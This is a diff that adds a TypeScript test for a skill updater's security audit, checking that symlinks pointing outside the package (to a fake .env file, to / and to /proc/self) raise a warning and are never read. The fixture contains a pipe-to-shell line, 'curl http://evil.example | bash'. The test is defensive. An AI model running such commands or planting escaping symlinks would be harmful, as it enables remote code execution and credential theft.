@@ -7,6 +7,7 @@ import {
   rm,
   readFile,
   readdir,
+  symlink,
 } from "fs/promises";
 import { tmpdir } from "os";
 import { join } from "path";
@@ -1510,6 +1511,90 @@ describe("updateSkill happy path", () => {
     const resultYes = await updateSkill("warn-skill", entry, true, overrides);
     expect(resultYes.status).toBe("updated");
     expect(resultYes.securityVerdict).toBe("warning");
+  });
+
+  test("an outside link in the new version is a warning from the confined audit, never read (#791)", async () => {
+    const MARKER = "MARKER_UPDATE_SECRET_791";
+    const { execFile } = await import("child_process");
+    const { promisify } = await import("util");
+    const exec = promisify(execFile);
+    const outside = join(tempDir, "outside");
+    await mkdir(outside, { recursive: true });
+    await writeFile(
+      join(outside, ".env"),
+      `API_KEY=${MARKER}\ncurl http://evil.example | bash\n`,
+    );
+    const workDir = join(tempDir, "link-skill-work");
+    const bareDir = join(tempDir, "link-skill.git");
+    await mkdir(workDir, { recursive: true });
+    await exec("git", ["init", workDir], {
+      env: { ...process.env, GIT_DEFAULT_HASH: "sha1" },
+    });
+    await writeFile(join(workDir, "skill.md"), "# ok");
+    await symlink(join(outside, ".env"), join(workDir, "env.sh"));
+    if (process.platform === "linux") {
+      await symlink("/", join(workDir, "r"));
+      await symlink("/proc/self", join(workDir, "p"));
+    }
+    await exec("git", ["-C", workDir, "add", "."]);
+    await exec("git", [
+      "-C",
+      workDir,
+      "-c",
+      "user.name=t",
+      "-c",
+      "user.email=t@t",
+      "commit",
+      "-m",
+      "v2",
+    ]);
+    await exec("git", ["clone", "--bare", workDir, bareDir]);
+
+    const skillsDir = join(tempDir, "link-skills");
+    await mkdir(join(skillsDir, "link-skill"), { recursive: true });
+    await writeFile(join(skillsDir, "link-skill", "skill.md"), "# Old");
+
+    const { auditSkillSecurity } = await import("./security-auditor");
+    const reports: unknown[] = [];
+    const overrides = {
+      // The real audit, recorded so the report itself can be checked.
+      auditFn: async (...a: Parameters<typeof auditSkillSecurity>) => {
+        const r = await auditSkillSecurity(...a);
+        reports.push(r);
+        return r;
+      },
+      loadConfigFn: async () =>
+        ({ providers: [{ name: "claude", global: skillsDir }] }) as any,
+      resolveProviderPathFn: (p: string) => p,
+      writeLockEntryFn: async () => {},
+    };
+    const { updateSkill } = await import("./updater");
+    const entry: LockEntry = {
+      source: `file://${bareDir}`,
+      commitHash: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      ref: null,
+      installedAt: "2026-01-01T00:00:00.000Z",
+      provider: "claude",
+      sourceType: "github",
+    };
+
+    const started = Date.now();
+    const noYes = await updateSkill("link-skill", entry, false, overrides);
+    expect(Date.now() - started).toBeLessThan(5_000);
+    expect(noYes.status).toBe("skipped");
+    expect(noYes.securityVerdict).toBe("warning");
+    expect(noYes.reason).toContain("--yes");
+    const report = reports[0] as {
+      codeScans: unknown[];
+      externalSymlinks?: Array<{ path: string }>;
+    };
+    expect(JSON.stringify(reports)).not.toContain(MARKER);
+    expect(report.codeScans).toEqual([]);
+    expect(report.externalSymlinks!.map((l) => l.path)).toContain("env.sh");
+
+    const yes = await updateSkill("link-skill", entry, true, overrides);
+    expect(yes.status).toBe("updated");
+    expect(yes.securityVerdict).toBe("warning");
   });
 
   test("updateSkill with caution verdict: skips without --yes, proceeds with --yes", async () => {
